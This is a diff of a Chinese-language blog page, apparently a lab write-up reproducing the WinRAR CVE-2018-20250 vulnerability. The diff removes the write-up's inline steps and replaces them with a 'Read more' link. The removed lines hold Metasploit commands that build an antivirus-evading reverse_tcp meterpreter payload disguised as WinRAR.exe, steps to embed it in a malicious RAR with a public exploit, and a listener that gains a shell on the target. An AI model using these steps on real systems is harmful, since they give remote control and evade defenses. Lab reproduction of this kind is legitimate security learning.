@@ -299,8 +299,7 @@
 
       
         
-          
-            <h1 id="1-漏洞细节"><a href="#1-漏洞细节" class="headerlink" title="1.漏洞细节"></a>1.漏洞细节</h1><blockquote>
+          <h1 id="1-漏洞细节"><a href="#1-漏洞细节" class="headerlink" title="1.漏洞细节"></a>1.漏洞细节</h1><blockquote>
 <p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>
 </blockquote>
 <h1 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2.漏洞影响版本"></a>2.漏洞影响版本</h1><blockquote>
@@ -340,23 +339,13 @@
 </tbody>
 </table>
 <p>exp下载：<a href="https://github.com/WyAtu/CVE-2018-20250/" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250/</a></p>
-<h1 id="4-漏洞复现过程"><a href="#4-漏洞复现过程" class="headerlink" title="4.漏洞复现过程"></a>4.漏洞复现过程</h1><h2 id="4-1使用Metasploit5生成免杀Payload"><a href="#4-1使用Metasploit5生成免杀Payload" class="headerlink" title="4.1使用Metasploit5生成免杀Payload"></a>4.1使用Metasploit5生成免杀Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">show info</span><br><span class="line">set filename WinRAR.exe</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.126.126</span><br><span class="line">set lport 10260</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/01.evasion.png"> 
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/02.run.png"> 
-<h2 id="4-2使用exp生成恶意程序"><a href="#4-2使用exp生成恶意程序" class="headerlink" title="4.2使用exp生成恶意程序"></a>4.2使用exp生成恶意程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop</span><br><span class="line">git clone https://github.com/WyAtu/CVE-2018-20250.git</span><br><span class="line">cd CVE-2018-20250</span><br><span class="line">cp /root/.msf4/local/WinRAR.exe ./</span><br><span class="line">vim exp.py</span><br></pre></td></tr></table></figure>
-<p>将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe”</p>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/03.edit.png"> 
-<p>将CVE-2018-20250文件夹复制到Windows10中，执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
-<p>生成恶意程序test.rar</p>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/04.Evil.png"> 
-<h2 id="4-3在靶机上运行恶意程序"><a href="#4-3在靶机上运行恶意程序" class="headerlink" title="4.3在靶机上运行恶意程序"></a>4.3在靶机上运行恶意程序</h2><p>将test.rar复制到Windows7上，解压运行</p>
-<h2 id="4-4在Kali-Linux上执行Metasploit监听"><a href="#4-4在Kali-Linux上执行Metasploit监听" class="headerlink" title="4.4在Kali Linux上执行Metasploit监听"></a>4.4在Kali Linux上执行Metasploit监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.126.126</span><br><span class="line">set lport 10260</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<h2 id="4-5控制靶机"><a href="#4-5控制靶机" class="headerlink" title="4.5控制靶机"></a>4.5控制靶机</h2><p>Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。</p>
-<img src="/2019/03/15/Writeup-on-CVE-2018-20250/05.session-opened.png"> 
-<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h1><p>刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/03/15/Writeup-on-CVE-2018-20250/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
